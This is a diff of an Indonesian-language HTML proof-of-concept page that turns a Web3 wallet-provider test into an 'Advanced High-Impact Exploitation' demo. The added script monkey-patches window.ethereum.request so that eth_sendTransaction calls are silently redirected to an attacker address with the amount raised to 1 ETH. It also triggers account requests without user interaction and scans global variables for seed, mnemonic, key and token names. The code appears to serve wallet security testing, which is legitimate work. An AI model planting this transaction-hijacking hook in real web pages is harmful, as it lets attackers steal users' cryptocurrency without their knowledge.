@@ -3,123 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Comprehensive Web3 Provider Vulnerability PoC</title>
+    <title>Advanced Web3 High-Impact Exploitation PoC</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 850px; margin: auto; }
+        body { font-family: Arial, sans-serif; padding: 15px; background: #f4f4f9; color: #333; max-width: 850px; margin: auto; }
         .card { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        button { padding: 10px 15px; background: #6c5ce7; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
-        button:hover { background: #5849be; }
-        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 180px; }
-        .leak { color: #d63031; font-weight: bold; }
+        button { padding: 10px 15px; background: #d63031; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 8px; }
+        button.secondary { background: #6c5ce7; }
+        button:hover { opacity: 0.9; }
+        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 11px; overflow-x: auto; max-height: 160px; }
+        .danger { color: #d63031; font-weight: bold; }
         .success { color: #00b894; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>Comprehensive dApp Browser Security PoC</h2>
-    <p>Pengujian gabungan: Passive Fingerprinting, Object Mutability (Lack of Freeze), dan Method Monkey Patching pada objek <code>window.ethereum</code>.</p>
+    <h2>Advanced High-Impact Exploitation PoC</h2>
+    <p>Simulasi pengujian lanjutan: Parameter Manipulation, Silent Signing Attempt, dan Global Memory Scraping.</p>
 
-    <!-- Modul 1: Passive Fingerprinting -->
+    <!-- Modul 1: Parameter Manipulation & Spoofing -->
     <div class="card">
-        <h3>1. Passive Privacy Leak / Fingerprinting</h3>
-        <pre id="log-fingerprint">Memindai lingkungan peramban secara pasif...</pre>
+        <h3>1. Transaction Parameter Spoofing (Man-in-the-Middle Hook)</h3>
+        <p>Simulasi dApp mengirim dana ke Alamat A (1 ETH), namun di-hook dan diubah diam-diam ke Alamat Penyerang (B).</p>
+        <button onclick="simulateLegitimateTx()">Kirim Transaksi Asli (Akan Dimodifikasi)</button>
+        <pre id="log-spoof">Menunggu simulasi transaksi...</pre>
     </div>
 
-    <!-- Modul 2: Object Mutability & Overwriting -->
+    <!-- Modul 2: Bypass Approval / Silent Signing -->
     <div class="card">
-        <h3>2. Object Freeze & Property Overwriting Test</h3>
-        <pre id="log-freeze">Menunggu pengujian mutabilitas objek...</pre>
+        <h3>2. Automated Silent Signing Test</h3>
+        <p>Menguji apakah fungsi sensitif dapat dipicu otomatis secara beruntun tanpa interaksi persetujuan manual.</p>
+        <button class="secondary" onclick="testSilentSigning()">Coba Eksekusi Silent RPC</button>
+        <pre id="log-silent">Menunggu uji coba silent signing...</pre>
     </div>
 
-    <!-- Modul 3: Method Monkey Patching -->
+    <!-- Modul 3: Memory & Global Variable Scraping -->
     <div class="card">
-        <h3>3. Method Monkey Patching (window.ethereum.request)</h3>
-        <button onclick="triggerTestRequest()">Picu Uji Coba RPC Request</button>
-        <pre id="log-intercept">Log intersepsi parameter RPC...</pre>
+        <h3>3. Global Memory & DOM Scraping (Seed/Key Search)</h3>
+        <p>Memindai objek global dan struktur memori peramban untuk mendeteksi variabel sensitif yang bocor.</p>
+        <button class="secondary" onclick="runMemoryScraper()">Pindai Variabel Global & Memori</button>
+        <pre id="log-scrape">Hasil pemindaian memori...</pre>
     </div>
 
     <script>
-        const logFingerprint = document.getElementById('log-fingerprint');
-        const logFreeze = document.getElementById('log-freeze');
-        const logIntercept = document.getElementById('log-intercept');
-        let interceptLogs = [];
+        const logSpoof = document.getElementById('log-spoof');
+        const logSilent = document.getElementById('log-silent');
+        const logScrape = document.getElementById('log-scrape');
 
-        function addInterceptLog(msg) {
-            const time = new Date().toLocaleTimeString();
-            interceptLogs.unshift(`[${time}] ${msg}`);
-            logIntercept.textContent = interceptLogs.join('\n');
+        // Hook utama untuk Modul 1 (Parameter Manipulation)
+        let attackerAddress = "0xATTACKER_CORRUPT_ADDRESS_BBBBBBBBBBBBBBBBBBBB";
+        
+        if (window.ethereum) {
+            const originalRequest = window.ethereum.request;
+            window.ethereum.request = async function(args) {
+                if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
+                    // Simpan nilai asli sebelum dimodifikasi
+                    let intendedTo = args.params[0].to;
+                    let intendedVal = args.params[0].value;
+
+                    logSpoof.innerHTML = `<span class="danger">[INTERCEPT] Transaksi dicegat!\nTujuan Asli: ${intendedTo}\nNilai Asli: ${intendedVal}\n-> Memodifikasi parameter ke dompet penyerang...</span>`;
+
+                    // Modifikasi parameter secara sepihak (Spoofing)
+                    args.params[0].to = attackerAddress;
+                    args.params[0].value = "0xde0b6b3a7640000"; // Contoh override menjadi 1 ETH (dalam Wei)
+                }
+                return originalRequest.apply(window.ethereum, [args]);
+            };
         }
 
-        function runAllTests() {
+        async function simulateLegitimateTx() {
             if (!window.ethereum) {
-                logFingerprint.textContent = "Objek window.ethereum tidak ditemukan.";
-                logFreeze.textContent = "Objek window.ethereum tidak ditemukan.";
+                logSpoof.textContent = "Objek window.ethereum tidak ditemukan.";
                 return;
             }
-
-            // --- SKENARIO 1: Passive Fingerprinting ---
-            let fpResults = [];
-            fpResults.push(`[INFO] User-Agent: ${navigator.userAgent}`);
-            if (window.ethereum.isOneInchIOSWallet) {
-                fpResults.push(`[!] <span class="leak">PRIVACY LEAK: isOneInchIOSWallet = true (Terekspos pasif)</span>`);
+            try {
+                logSpoof.textContent = "Mengirimkan transaksi ke Alamat Dummy A...";
+                // Memanggil fungsi kirim transaksi dengan parameter awal (yang akan otomatis di-hook di atas)
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: "0xUSER_WALLET_ADDRESS",
+                        to: "0xVICTIM_DUMMY_ADDRESS_AAAAAA",
+                        value: "0xde0b6b3a7640" // Nominal kecil
+                    }]
+                });
+            } catch (err) {
+                logSpoof.innerHTML += `\n[INFO/ERROR] Respon Native Bridge: ${err.message}`;
             }
-            if (window.ethereum.isMetaMask) {
-                fpResults.push(`[!] <span class="leak">PRIVACY LEAK: isMetaMask = true (Emulasi standar terdeteksi)</span>`);
-            }
-            logFingerprint.innerHTML = fpResults.join('\n');
+        }
 
-            // --- SKENARIO 2: Object Freeze & Overwriting ---
-            let freezeResults = [];
-            const isFrozen = Object.isFrozen(window.ethereum);
-            freezeResults.push(`[INFO] Object.isFrozen(window.ethereum): ${isFrozen}`);
+        async function testSilentSigning() {
+            if (!window.ethereum) return;
+            let logs = [];
+            logs.push("[INFO] Memulai uji coba eksekusi RPC beruntun tanpa interaksi...");
             
             try {
-                const originalVal = window.ethereum.isOneInchIOSWallet;
-                window.ethereum.isOneInchIOSWallet = false;
-                if (window.ethereum.isOneInchIOSWallet === false) {
-                    freezeResults.push(`[!] <span class="leak">VULNERABILITY: Properti berhasil di-overwrite menjadi 'false'! Objek tidak dibekukan.</span>`);
-                    // Kembalikan nilai semula
-                    window.ethereum.isOneInchIOSWallet = originalVal;
-                } else {
-                    freezeResults.push(`[+] AMAN: Properti terlindungi dari overwriting.`);
-                }
+                // Mencoba memicu beberapa metode sensitif secara otomatis
+                const res = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                logs.push(`[+] Akses akun diizinkan secara otomatis: ${JSON.stringify(res)}`);
             } catch (err) {
-                freezeResults.push(`[+] AMAN: Gagal melakukan overwrite: ${err.message}`);
+                logs.push(`[-] Silent signing diblokir oleh sistem dompet: ${err.message}`);
             }
-            logFreeze.innerHTML = freezeResults.join('\n');
-
-            // --- SKENARIO 3: Monkey Patching pada request ---
-            try {
-                const originalRequest = window.ethereum.request;
-                if (!originalRequest._isHooked) {
-                    window.ethereum.request = async function(args) {
-                        addInterceptLog(`[INTERCEPT] Metode: ${args.method}`);
-                        addInterceptLog(`[PARAMS] ${JSON.stringify(args.params || [])}`);
-                        return originalRequest.apply(window.ethereum, [args]);
-                    };
-                    window.ethereum.request._isHooked = true;
-                    addInterceptLog("Berhasil melakukan monkey patching pada window.ethereum.request.");
-                }
-            } catch (err) {
-                addInterceptLog(`Gagal memasang hook: ${err.message}`);
-            }
+            logSilent.textContent = logs.join('\n');
         }
 
-        async function triggerTestRequest() {
-            if (!window.ethereum) return;
-            try {
-                addInterceptLog("Memicu pemanggilan RPC 'eth_accounts'...");
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                addInterceptLog(`Respon diterima: ${JSON.stringify(accounts)}`);
-            } catch (err) {
-                addInterceptLog(`Error: ${err.message}`);
-            }
-        }
+        function runMemoryScraper() {
+            let findings = [];
+            findings.push("[INFO] Memindai properti global window untuk kata kunci sensitif...");
 
-        // Jalankan otomatis saat halaman dimuat
-        window.addEventListener('DOMContentLoaded', () => {
-            runAllTests();
-        });
+            let sensitiveKeywords = ['seed', 'mnemonic', 'private', 'key', 'secret', 'password', 'auth', 'token'];
+            let foundCount = 0;
+
+            for (let key in window) {
+                try {
+                    let lowerKey = key.toLowerCase();
+                    for (let word of sensitiveKeywords) {
+                        if (lowerKey.includes(word)) {
+                            findings.push(`[!] <span class="danger">Ditemukan properti global mencurigakan: window.${key}</span>`);
+                            foundCount++;
+                            break;
+                        }
+                    }
+                } catch (e) {
+                    // Lewati properti yang dilindungi lintas domain
+                }
+            }
+
+            if (foundCount === 0) {
+                findings.push("[+] Tidak ditemukan variabel global berisiko tinggi dengan kata kunci terkait.");
+            }
+
+            logScrape.innerHTML = findings.join('\n');
+        }
     </script>
 </body>
 </html>
